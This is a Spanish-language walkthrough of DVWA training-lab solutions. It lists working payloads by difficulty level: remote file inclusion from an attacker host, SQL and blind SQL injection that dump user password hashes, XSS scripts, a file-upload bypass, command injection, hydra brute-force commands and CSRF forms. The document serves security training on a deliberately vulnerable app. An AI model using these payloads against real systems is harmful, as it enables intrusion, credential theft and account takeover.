---
layout: default
title: "DVWA"
permalink: /dvwa/
---

# DVWA

Todos los laboratorios posteriormente expuestos los puedes encontrar para resolverlos en el siguiente link.

[http://dvwa.co.uk/](http://dvwa.co.uk/)

## Índice



DVWA 1.0.7

# FileInclusion

## LOW

http://192.168.56.103/vulnerabilities/fi/?page=http://192.168.56.1/a.txt

## MEDIUM

http://192.168.56.103/vulnerabilities/fi/?page=htthttp://p://192.168.56.1/a.txt

## HIGH

IMPOSIBLE

# SQLI

## LOW

```bash
' union select null,database()#
' union select null,table_name from imformation_schema#
' union select table_name,null from information_schema.tables#
' union select table_schema,null from information_schema.tables#
' union select table_name,null from information_schema.tables where table_schema='dvwa'#
' union select group_concat(table_name),null from information_schema.tables where table_schema='dvwa'#
' union select group_concat(table_name,':',table_schema),null from information_schema.tables where table_schema='dvwa'#

I> ' union select group_concat(column_name),null from information_schema.columns where table_name='users'#
O> user_id,first_name,last_name,user,password,avatar

I> ' union select group_concat('</br>',user,':',password),null from users#
O>	admin:5f4dcc3b5aa765d61d8327deb882cf99,
	gordonb:e99a18c428cb38d5f260853678922e03,
	1337:8d3533d75ae2c3966d7e0d4fcc69216b,
	pablo:0d107d09f5bbe40cade3de5c71e9e9b7,
	smithy:5f4dcc3b5aa765d61d8327deb882cf99

I> ' union select '<table border=1 style="width: 100%;  background-color: #f1f1c1;">',group_concat('<tr><th>',user,'</th><th>',password,'</th></tr>') from users#
O>	Lo de arriba pero con HTML de TABLA

Lista DB
I> ' union select distinct table_schema,null from information_schema.tables#
O>	First name: information_schema
	First name: cdcol
	First name: dvwa
	First name: mysql
	First name: phpmyadmin


I> ' union select 1,table_name from information_schema.tables where table_schema='cdcol'##
O> Surname: cds

I> ' union select 1,column_name from information_schema.columns where table_name='cds'##
O>	Surname: titel
	Surname: interpret
	Surname: jahr
	Surname: id

I> ' union select database(), group_concat('<br>',titel,':',interpret,':',jahr,':',id) from cdcol.cds# 
O> 	Beauty:Ryuichi Sakamoto:1990:1,
	Goodbye Country (Hello Nightclub):Groove Armada:2001:4,
	Glee:Bran Van 3000:1997:5
```

# SQLI BLIND

## LOW

```bash
I> 1'  union select database(),2 and '1'='1
0> First name: dvwa

I> 1'  union select version(),database() and '1'='1

I> 1' and 1=1 union select null,group_concat(table_name) from information_schema.tables where table_schema='dvwa'# 
O> Surname: guestbook,users

I> 1' and 1=1 union select null,group_concat(column_name) from information_schema.columns where table_name='users'# 
O> Surname: user_id,first_name,last_name,user,password,avatar

I> 1' and 1=1 union select null,group_concat(user,':',password,'</br>') from dvwa.users# 
O>	Surname: admin:5f4dcc3b5aa765d61d8327deb882cf99
	,gordonb:e99a18c428cb38d5f260853678922e03
	,1337:8d3533d75ae2c3966d7e0d4fcc69216b
	,pablo:0d107d09f5bbe40cade3de5c71e9e9b7
	,smithy:5f4dcc3b5aa765d61d8327deb882cf99
```


# XSS REFLE

## LOW

	<script>alert("XSS")</script>

## MEDIUM

	<script e.e>alert("XSS")</script>

## HIGH

IMPOSIBLE



# XSS STORED

## LOW

```html
message: <script>alert("XSS")</script>
```



DVWA - XSS STORED - MEDIUM

```html
name: <scripT e.e>alert("XSS2")</scripT >
```



DVWA - XSS STORED - HIGH

IMPOSIBLE

# FILE UPLOAD

## LOW

```html
archivo.php
```



## MEDIUM

```html
subirlo como archivo.jpg editar luego en la cabecera post el nombre archivo.jpg por archivo.php
```



## HIGH

IMPOSIBLE


# COMMAND EXEC

## LOW

```bash
127.0.0.1 && ls -ltri
```



## MEDIUM

```bash
127.0.0.1 &;& ls  -ltri
```



## HIGH

IMPOSIBLE

# BRUTE FORCE

## LOW

```bash
hydra 192.168.56.103 -V -l admin -P /usr/share/set/src/fasttrack/wordlist.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=723479p8ma122hf3f0hr1n1jn0; security=low"
```



## MEDIUM

```bash
hydra  192.168.56.103 -l admin  -P /usr/share/set/src/fasttrack/wordlist.txt -e ns  -F  -u  -t 4  -w 15  -v  -V http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=723479p8ma122hf3f0hr1n1jn0; security=medium"
```



## HIGH

IMPOSIBLE

# CSRF

## LOW

```bash
<form action="http://192.168.56.103/vulnerabilities/csrf/" method="GET">
	<input type="hidden" AUTOCOMPLETE="off" name="password_new" value="desdes">
	<input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="desdes">
	<input type="submit" value="Change" name="Change">
</form>
```

-> pollo.html

## MEDIUM

```html
<form action="http://192.168.56.103/vulnerabilities/csrf/" method="GET">
	<input type="hidden" AUTOCOMPLETE="off" name="password_new" value="desdes">
	<input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="desdes">
	<input type="submit" value="Change" name="Change">
</form>
```

-> 127.0.0.1.html